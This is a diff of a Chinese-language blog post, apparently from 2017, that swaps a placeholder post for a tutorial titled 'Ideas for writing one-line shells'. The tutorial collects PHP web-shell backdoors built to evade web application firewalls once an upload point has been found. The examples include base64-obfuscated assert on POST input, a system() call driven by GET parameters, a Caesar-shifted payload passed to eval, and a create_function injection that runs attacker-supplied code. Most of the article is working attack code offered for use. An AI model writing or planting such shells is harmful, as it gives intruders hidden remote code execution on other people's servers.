@@ -3,15 +3,21 @@
 <head>
   <meta charset="utf-8">
   
-  <title>hello | iosmosis&#39;s blog</title>
+  <title>一句话Shell编写思路 | iosmosis&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="article">
-<meta property="og:title" content="hello">
+  <meta name="description" content="很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路 
+经典方式应该是很常见的方法 利用可变变量进行赋值传值来打到过狗目的，例如：12345678&amp;lt;?php $jg16=base64_decode;$z=$jg16(YXNzZXJ0);$z($_POST[q]);?&amp;gt;这个一句话需要用到这个函数//base64_encode()">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一句话Shell编写思路">
 <meta property="og:url" content="http://iosmosis.github.io/2017/03/05/hello/index.html">
 <meta property="og:site_name" content="iosmosis's blog">
-<meta property="og:updated_time" content="2017-03-05T04:47:01.813Z">
+<meta property="og:description" content="很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路 
+经典方式应该是很常见的方法 利用可变变量进行赋值传值来打到过狗目的，例如：12345678&amp;lt;?php $jg16=base64_decode;$z=$jg16(YXNzZXJ0);$z($_POST[q]);?&amp;gt;这个一句话需要用到这个函数//base64_encode()">
+<meta property="og:updated_time" content="2017-03-07T06:48:34.670Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="hello">
+<meta name="twitter:title" content="一句话Shell编写思路">
+<meta name="twitter:description" content="很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路 
+经典方式应该是很常见的方法 利用可变变量进行赋值传值来打到过狗目的，例如：12345678&amp;lt;?php $jg16=base64_decode;$z=$jg16(YXNzZXJ0);$z($_POST[q]);?&amp;gt;这个一句话需要用到这个函数//base64_encode()">
   
     <link rel="alternative" href="/atom.xml" title="iosmosis&#39;s blog" type="application/atom+xml">
   
@@ -234,7 +240,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      hello
+      一句话Shell编写思路
     </h1>
   
 
@@ -251,7 +257,16 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        
+        <p>很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路 </p>
+<h2 id="经典方式"><a href="#经典方式" class="headerlink" title="经典方式"></a>经典方式</h2><h3 id="应该是很常见的方法-利用可变变量进行赋值传值来打到过狗目的，例如："><a href="#应该是很常见的方法-利用可变变量进行赋值传值来打到过狗目的，例如：" class="headerlink" title="应该是很常见的方法 利用可变变量进行赋值传值来打到过狗目的，例如："></a>应该是很常见的方法 利用<a href="http://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="external">可变变量</a>进行赋值传值来打到过狗目的，例如：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php <span class="variable">$jg16</span>=base64_decode;</div><div class="line"><span class="variable">$z</span>=<span class="variable">$jg16</span>(YXNzZXJ0);</div><div class="line"><span class="variable">$z</span>(<span class="variable">$_POST</span>[q]);</div><div class="line">?&gt;</div><div class="line">这个一句话需要用到这个函数</div><div class="line">//base64_encode();//base64编码</div><div class="line">//base64_decode();//base64解码</div><div class="line">主要就是进行加密然后传值绕过对一句话的检测　这次暂不详细讲解</div></pre></td></tr></table></figure>
+<p>##system()的巧妙利用</p>
+<p>##调用system()由于在php中system函数属于系统函数所以对于一般的waf是可以通杀的 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">system(<span class="variable">$_GET</span>[‘a’](<span class="variable">$_GET</span>[‘b’]))</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<h2 id="利用古典密码进行对shell加密"><a href="#利用古典密码进行对shell加密" class="headerlink" title="利用古典密码进行对shell加密"></a>利用古典密码进行对shell加密</h2><h3 id="在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）"><a href="#在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）" class="headerlink" title="在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）"></a>在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> kaisa(<span class="variable">$arr</span>)&#123;</div><div class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt; strlen(<span class="variable">$arr</span>);<span class="variable">$i</span>++)&#123;</div><div class="line"><span class="variable">$arr</span>[<span class="variable">$i</span>]=chr(ord(<span class="variable">$arr</span>[<span class="variable">$i</span>])-6);</div><div class="line">&#125;</div><div class="line"><span class="built_in">return</span> <span class="variable">$arr</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"><a href="#这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话" class="headerlink" title="这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"></a>这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"><span class="variable">$arr</span>=<span class="string">"j&#123;fq-)dUTXY`&#125;b.@"</span>;</div><div class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt; strlen(<span class="variable">$arr</span>);<span class="variable">$i</span>++)&#123;</div><div class="line"><span class="variable">$arr</span>[<span class="variable">$i</span>]=chr(ord(<span class="variable">$arr</span>[<span class="variable">$i</span>])-5);</div><div class="line">&#125;</div><div class="line"><span class="built_in">eval</span>(<span class="variable">$arr</span>);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<h2 id="利用函数代码执行来代替eval"><a href="#利用函数代码执行来代替eval" class="headerlink" title="利用函数代码执行来代替eval"></a>利用函数代码执行来代替eval</h2><h3 id="利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行"><a href="#利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行" class="headerlink" title="利用 create_function代码执行漏洞 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行"></a>利用 <a href="http://www.cnseay.com/1901/" target="_blank" rel="external">create_function代码执行漏洞</a> 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行</h3><p>这里构造为$code = “n;}$_POST[x];/*”;<br>注意：双引号里面的变量会进行解析，即如果我们echo $code 并且post提交x=phpinfo();那么输出应该是：n;}phpinfo();;/</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">payload解析：</div><div class="line"> </div><div class="line">;来结束语句</div><div class="line"> </div><div class="line">&#125;来结束函数体</div><div class="line"> </div><div class="line">phpinfo();;就在函数体外面被<span class="built_in">eval</span>执行了</div><div class="line"> </div><div class="line">/*注释多余的代码</div><div class="line"> </div><div class="line">最终代码：<span class="built_in">eval</span>(function_lambda_func(<span class="variable">$args</span>)&#123;n;&#125;phpinfo();;/*&#125;)</div><div class="line">最终构造出</div><div class="line"></div><div class="line">&lt;?php</div><div class="line"><span class="variable">$args</span> = <span class="string">"１"</span>;</div><div class="line"><span class="variable">$code</span> = <span class="string">"n;&#125;<span class="variable">$_POST</span>[x];/*"</span>;</div><div class="line"><span class="built_in">echo</span> create_function(<span class="string">'$args'</span>,<span class="variable">$code</span>);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<h3 id="这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起"><a href="#这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起" class="headerlink" title="这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起"></a>这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起</h3>
       
       
         <div class="page-reward">
@@ -305,12 +320,12 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/03/05/hello/">hello</a></p>
+        <p><span>本文标题:</span><a href="/2017/03/05/hello/">一句话Shell编写思路</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 iosmosis 的个人博客">iosmosis</a></p>
         <p><span>发布时间:</span>2017年03月05日 - 12时47分</p>
-        <p><span>最后更新:</span>2017年03月05日 - 12时47分</p>
+        <p><span>最后更新:</span>2017年03月07日 - 14时48分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/03/05/hello/" title="hello">http://iosmosis.github.io/2017/03/05/hello/</a>
+            <span>原始链接:</span><a class="post-url" href="/2017/03/05/hello/" title="一句话Shell编写思路">http://iosmosis.github.io/2017/03/05/hello/</a>
             <span class="copy-path" data-clipboard-text="原文: http://iosmosis.github.io/2017/03/05/hello/　　作者: iosmosis" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
@@ -322,22 +337,12 @@
 
 
 
-<nav id="article-nav">
-  
-  
-    <a href="/2017/03/05/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Hello World</div>
-      <strong class="article-nav-caption">></strong>
-    </a>
-  
-</nav>
-
   
 </article>
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#经典方式"><span class="toc-number">1.</span> <span class="toc-text">经典方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#应该是很常见的方法-利用可变变量进行赋值传值来打到过狗目的，例如："><span class="toc-number">1.1.</span> <span class="toc-text">应该是很常见的方法 利用可变变量进行赋值传值来打到过狗目的，例如：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用古典密码进行对shell加密"><span class="toc-number">2.</span> <span class="toc-text">利用古典密码进行对shell加密</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）"><span class="toc-number">2.1.</span> <span class="toc-text">在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"><span class="toc-number">2.2.</span> <span class="toc-text">这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用函数代码执行来代替eval"><span class="toc-number">3.</span> <span class="toc-text">利用函数代码执行来代替eval</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行"><span class="toc-number">3.1.</span> <span class="toc-text">利用 create_function代码执行漏洞 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起"><span class="toc-number">3.2.</span> <span class="toc-text">这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起</span></a></li></ol></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -385,7 +390,7 @@
     
       <div class="duoshuo" id="comments">
     <!-- 多说评论框 start -->
-    <div class="ds-thread" data-thread-key="2017/03/05/hello/" data-title="hello" data-url="http://iosmosis.github.io/2017/03/05/hello/"></div>
+    <div class="ds-thread" data-thread-key="2017/03/05/hello/" data-title="一句话Shell编写思路" data-url="http://iosmosis.github.io/2017/03/05/hello/"></div>
     <!-- 多说评论框 end -->
     <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
     <script type="text/javascript">
@@ -412,12 +417,10 @@
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2017/03/05/hello-world/" title="下一篇: Hello World">
-                <i class="fa fa-angle-right"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/03/05/hello/">hello</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/05/hello-world/">Hello World</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/03/05/hello/">一句话Shell编写思路</a></li></ul>
     <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
     <script>
         $(".post-list").addClass("toc-article");
